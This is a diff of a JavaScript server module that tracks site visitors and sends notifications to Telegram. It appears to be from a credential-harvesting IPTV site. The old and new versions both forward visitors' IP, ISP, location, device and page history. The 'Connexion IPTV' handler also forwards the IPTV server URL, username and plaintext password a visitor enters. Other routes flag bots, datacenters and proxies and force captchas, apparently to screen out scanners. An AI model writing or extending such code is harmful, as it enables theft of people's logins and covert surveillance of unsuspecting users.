@@ -115,41 +115,35 @@ async function handleVisit(req, body) {
     writeJSON(config.VISITS_FILE, state.VISITS);
   });
 
-  const statusIcon = session.isASNBlocked ? '🚫' : session.isBanned ? '🚫' : session.isDatacenter ? '🤖' : session.isProxy ? '⚠️' : '✅';
-  const statusLabel = session.isASNBlocked ? 'ASN Bloqué' : session.isBanned ? 'Banned' : session.isDatacenter ? 'Bot/DC' : session.isProxy ? 'Proxy' : 'Human visitor';
+  const statusIcon = session.isASNBlocked ? '🚫' : session.isBanned ? '🚫' : session.isDatacenter ? '🤖' : session.isProxy ? '⚠️' : '👤';
+  const statusLabel = session.isASNBlocked ? 'ASN bloqué' : session.isBanned ? 'Banni' : session.isDatacenter ? 'Bot / Datacenter' : session.isProxy ? 'Proxy détecté' : 'Visiteur';
 
   const visitCount = state.VISITS.filter(v => v.ip === clientIP).length;
   const isReturning = visitCount > 1;
-  const clientHeader = isReturning
-    ? `🆔 <b>Visiteur connu</b> (${visitCount} visites)\n  ↳ <code>${escapeHTML(session.id)}</code>`
-    : `🆕 <b>New Client Visit</b>\n  ↳ <code>${escapeHTML(session.id)}</code>`;
 
-  const deviceStr = `${detailed.engine}${detailed.engineVersion ? ' ' + detailed.engineVersion : ''}`;
-  const platformStr = `${detailed.platform}${detailed.platformVersion ? ' ' + detailed.platformVersion : ''}`;
-  const browserStr = `${detailed.browser}${detailed.browserVersion ? ' ' + detailed.browserVersion : ''}`;
-  const langStr = languages.length > 0 ? languages.join(', ') : 'N/A';
-  const isMobileStr = detailed.isMobile ? 'Yes ✅' : 'No ❌';
+  const flag = (session.countryCode || '??').toUpperCase();
+  const locParts = [session.country, session.city].filter(Boolean);
+  const locStr = locParts.length ? locParts.join(' · ') : 'Inconnu';
+  const deviceStr = [detailed.platform, detailed.browser].filter(Boolean).join(' · ') || 'Inconnu';
+  const langStr = languages.length > 0 ? languages.slice(0, 3).join(', ') : '—';
 
   const pageBreakdown = formatPageBreakdown(clientIP);
 
+  const header = isReturning
+    ? `🆔 Le client existe déjà`
+    : `🆕 Nouveau client`;
+
   const msg = [
-    clientHeader,
+    `${header}`,
+    `<code>${escapeHTML(session.id)}</code>`,
     ``,
-    `${statusIcon} <b>Status:</b> ${escapeHTML(statusLabel)}`,
-    `🔁 <b>Visites:</b> ${visitCount}x`,
-    `📍 <b>IP:</b> <code>${escapeHTML(session.ip)}</code>`,
-    `🌍 <b>Country:</b> ${escapeHTML(session.country || 'Inconnu')}`,
-    `🏴 <b>Code:</b> ${escapeHTML(session.countryCode || '??')}`,
-    `📡 <b>ISP:</b> ${escapeHTML(session.isp || 'Inconnu')}`,
-    `🔧 <b>Device:</b> ${escapeHTML(deviceStr)}`,
-    `💻 <b>Platform:</b> ${escapeHTML(platformStr)}`,
-    `🌐 <b>Browser:</b> ${escapeHTML(browserStr)}`,
-    `🈯 <b>Languages:</b> ${escapeHTML(langStr)}`,
-    `📱 <b>Is Mobile:</b> ${isMobileStr}`,
-    body.channelName ? `📺 <b>Chaîne:</b> ${escapeHTML(body.channelName)}` : null,
-    body.streamUrl ? `🔗 <b>Flux:</b> <code>${escapeHTML(body.streamUrl)}</code>` : null,
+    `${statusIcon} <b>${escapeHTML(statusLabel)}</b>  ·  🔁 ${visitCount}x`,
+    `${flag} 📍 <b>${escapeHTML(locStr)}</b>  ·  📡 ${escapeHTML(session.isp || 'N/A')}`,
+    `💻 ${escapeHTML(deviceStr)}  ·  🌐 ${escapeHTML(langStr)}${detailed.isMobile ? '  ·  📱 Mobile' : ''}`,
+    body.channelName ? `📺 ${escapeHTML(body.channelName)}` : null,
+    body.streamUrl ? `<code>${escapeHTML(body.streamUrl)}</code>` : null,
     pageBreakdown ? `` : null,
-    pageBreakdown ? `📄 <b>Pages visitées :</b>` : null,
+    pageBreakdown ? `<b>Pages :</b>` : null,
     pageBreakdown || null,
   ].filter(Boolean).join('\n');
 
@@ -220,6 +214,7 @@ export async function handleTrackingRoutes(pathname, req, res, body) {
       isPremium: state.PREMIUM_LOOKUP.has(session.ip),
       forceCaptcha: forceCaptcha && !isAdminBypass && !hasTrustCookie,
       waitDelay: state.WAIT_DELAY || 0,
+      siteStopped: state.SITE_STOPPED || false,
     }));
     return true;
   }
@@ -240,10 +235,10 @@ export async function handleTrackingRoutes(pathname, req, res, body) {
     const emoji = pageEmojis[page] || '📄';
     const pageBreakdown = formatPageBreakdown(clientIP);
     const msg = [
-      `${emoji} <b>PAGE: ${escapeHTML(page.toUpperCase())}</b>`,
-      `📍 <b>IP:</b> <code>${escapeHTML(clientIP)}</code>`,
+      `${emoji} Page : ${escapeHTML(page.toUpperCase())}`,
+      `📍 <code>${escapeHTML(clientIP)}</code>`,
       pageBreakdown ? `` : null,
-      pageBreakdown ? `📄 <b>Pages visitées :</b>` : null,
+      pageBreakdown ? `<b>Pages :</b>` : null,
       pageBreakdown || null,
     ].filter(Boolean).join('\n');
     await sendTelegram(msg, clientIP);
@@ -284,11 +279,9 @@ export async function handleTrackingRoutes(pathname, req, res, body) {
     const data = parsed.ok ? parsed.data : {};
     logAttack(clientIP, 'captcha_fail', `${data.equation} → ${data.input}`, req.headers['user-agent']);
     const msg = [
-      `⚠️ <b>CAPTCHA RATÉ</b>`,
-      `📍 <b>IP:</b> <code>${escapeHTML(clientIP)}</code>`,
-      `🏷️ <b>Type:</b> ${escapeHTML(data.type || 'Inconnu')}`,
-      `🧮 <b>Calcul:</b> <code>${escapeHTML(data.equation || '')}</code>`,
-      `📥 <b>Réponse entrée:</b> <code>${escapeHTML(data.input || '')}</code>`,
+      `⚠️ Captcha raté`,
+      `📍 <code>${escapeHTML(clientIP)}</code>`,
+      `🧮 <code>${escapeHTML(data.equation || '')}</code> → <code>${escapeHTML(data.input || '')}</code>`,
     ].join('\n');
     await sendTelegram(msg, clientIP);
     console.log(`[Captcha] Echec pour ${clientIP}: ${data.equation} → ${data.input}`);
@@ -313,12 +306,11 @@ export async function handleTrackingRoutes(pathname, req, res, body) {
       state.channelNotifyCache.set(clientIP, now);
       const pageBreakdown = formatPageBreakdown(clientIP);
       const msg = [
-        `📺 <b>CHAÎNE SÉLECTIONNÉE</b>`,
-        `📍 <b>IP:</b> <code>${escapeHTML(clientIP)}</code>`,
-        `🎬 <b>Chaîne:</b> ${escapeHTML(data.channelName || "Page d'accueil")}`,
-        data.streamUrl ? `🔗 <b>Flux:</b> <code>${escapeHTML(data.streamUrl)}</code>` : null,
+        `📺 ${escapeHTML(data.channelName || "Page d'accueil")}`,
+        `📍 <code>${escapeHTML(clientIP)}</code>`,
+        data.streamUrl ? `<code>${escapeHTML(data.streamUrl)}</code>` : null,
         pageBreakdown ? `` : null,
-        pageBreakdown ? `📄 <b>Pages visitées :</b>` : null,
+        pageBreakdown ? `<b>Pages :</b>` : null,
         pageBreakdown || null,
       ].filter(Boolean).join('\n');
       await sendTelegram(msg, clientIP);
@@ -361,13 +353,13 @@ export async function handleTrackingRoutes(pathname, req, res, body) {
     }
     const pageBreakdown = formatPageBreakdown(clientIP);
     const msg = [
-      '📡 <b>CONNEXION IPTV</b>',
-      `📍 <b>IP:</b> <code>${escapeHTML(clientIP)}</code>`,
-      `🖥️ <b>Server URL:</b> <code>${escapeHTML(server)}</code>`,
-      `👤 <b>Username:</b> <code>${escapeHTML(username)}</code>`,
-      `🔑 <b>Password:</b> <code>${escapeHTML(password)}</code>`,
+      '📡 Connexion IPTV',
+      `📍 <code>${escapeHTML(clientIP)}</code>`,
+      `🖥️ <code>${escapeHTML(server)}</code>`,
+      `👤 <code>${escapeHTML(username)}</code>`,
+      `🔑 <code>${escapeHTML(password)}</code>`,
       pageBreakdown ? `` : null,
-      pageBreakdown ? `📄 <b>Pages visitées :</b>` : null,
+      pageBreakdown ? `<b>Pages :</b>` : null,
       pageBreakdown || null,
     ].filter(Boolean).join('\n');
     await sendTelegram(msg, clientIP);
